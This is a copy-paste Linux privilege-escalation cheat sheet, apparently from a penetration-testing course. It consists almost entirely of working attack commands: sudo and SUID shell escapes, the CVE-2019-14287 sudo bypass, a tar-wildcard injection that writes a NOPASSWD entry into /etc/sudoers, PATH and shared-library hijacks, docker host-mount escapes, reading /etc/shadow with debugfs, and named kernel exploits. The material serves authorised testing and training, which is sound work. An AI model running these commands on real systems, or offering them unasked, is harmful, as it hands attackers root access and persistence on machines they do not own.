# Linux Privilege Escalation Cheat Sheet

Flat copy-paste reference (explanations in `25-linux-privesc/README.md`).
Placeholders: `<LHOST>`, `<PORT>`, `<USER>`.

## Quick checks (run first, right after landing)
```bash
id ; sudo -l                               # my rights + what I can run as root (biggest win)
find / -perm -4000 2>/dev/null             # SUID binaries (→ GTFOBins)
find / -perm -2000 2>/dev/null             # SGID
find / -perm -o+w -type f 2>/dev/null      # world-writable files
find / -perm -o+w -type d 2>/dev/null      # world-writable dirs
crontab -l ; cat /etc/crontab ; ls -la /etc/cron.*   # cron (writable script = root)
getcap -r / 2>/dev/null                    # capabilities (cap_setuid etc.)
uname -a ; cat /etc/os-release             # version → kernel exploits
cat ~/.bash_history ; cat /etc/passwd
```
Automate: `linpeas.sh`, `LinEnum.sh`, and `./pspy64 -pf -i 1000` (see root cron/processes without root).

## Priority order of attack
`sudo -l` → SUID + GTFOBins → capabilities (`getcap`) → privileged groups (`id`) → cron/wildcards → writable PATH/libs → kernel exploit **last** (riskiest).

## sudo abuse
```bash
sudo -l
sudo vim -c ':!/bin/sh'                     # GTFOBins shell escapes:
sudo awk 'BEGIN{system("/bin/sh")}'
sudo find . -exec /bin/bash \;
sudo less /etc/passwd                        # then !sh
# sudo tcpdump -z <script>                    (postrotate runs as root)
# env_keep LD_PRELOAD:  sudo LD_PRELOAD=/tmp/x.so <allowed-cmd>
# CVE-2019-14287:  sudo -u#-1 /bin/bash       (sudo < 1.8.28)
```

## SUID / SGID
```bash
find / -perm -4000 -exec ls -ldb {} \; 2>/dev/null
find / -exec /bin/sh -p \; -quit            # if find is SUID (-p keeps euid)
vim -c ':!/bin/sh'                           # if vim is SUID → GTFOBins per binary
```

## Capabilities
```bash
getcap -r / 2>/dev/null
# cap_setuid → setuid(0)+shell = root ; cap_dac_override → overwrite /etc/shadow ; cap_sys_admin → mount
```

## PATH hijack / wildcard abuse
```bash
echo $PATH ; PATH=.:$PATH ; export PATH
echo '/bin/bash' > ls ; chmod +x ls         # script calling bare `ls` runs your bash
# tar wildcard (root cron runs `tar *` in a writable dir):
echo 'echo "<USER> ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > shell.sh
echo "" > "--checkpoint-action=exec=sh shell.sh" ; echo "" > --checkpoint=1
```

## Privileged groups / container escapes
```bash
# docker:
docker run -v /:/mnt -it <img> chroot /mnt bash
# writable docker.sock:
docker -H unix:///var/run/docker.sock run --privileged -v /:/host -it <img>
# lxd/lxc: import image → init -c security.privileged=true → add disk source=/ → exec → host / at /mnt/root
# disk group:  debugfs /dev/sda1          (read /etc/shadow raw)
# NFS no_root_squash: showmount -e <host> → mount → drop a SUID-root shell on the share → run on target
```

## Shared-library / Python hijack
```bash
ldd <suid-bin>                              # custom .so?
readelf -d <suid-bin> | grep PATH           # writable RUNPATH → drop malicious .so
python3 -c 'import sys;print(sys.path)'     # writable module / earlier sys.path dir → shadow it
```

## Restricted shell escape
```bash
echo $PATH; env; ls /usr/bin                # what's allowed?
export PATH=/bin:/usr/bin ; export SHELL=/bin/bash ; $SHELL
vi            # :!/bin/sh   or  :set shell=/bin/bash :shell
less /etc/passwd   # then !/bin/sh      |  awk 'BEGIN{system("/bin/sh")}'
```

## Kernel / named CVEs (last resort — confirm version)
```bash
uname -r ; cat /etc/os-release
searchsploit "linux kernel <version>"
# PwnKit CVE-2021-4034 (polkit, near-universal) ; DirtyPipe CVE-2022-0847 (kernel 5.8–5.17)
# DirtyCow CVE-2016-5195 ; Baron Samedit CVE-2021-3156
# metasploit: post/multi/recon/local_exploit_suggester
```

> `sudo -l`, writable cron scripts, abusable SUID (GTFOBins), and `getcap -r /` are the top quick wins. pspy reveals root cron you can't otherwise see. Kernel exploits can crash the box — save for last.
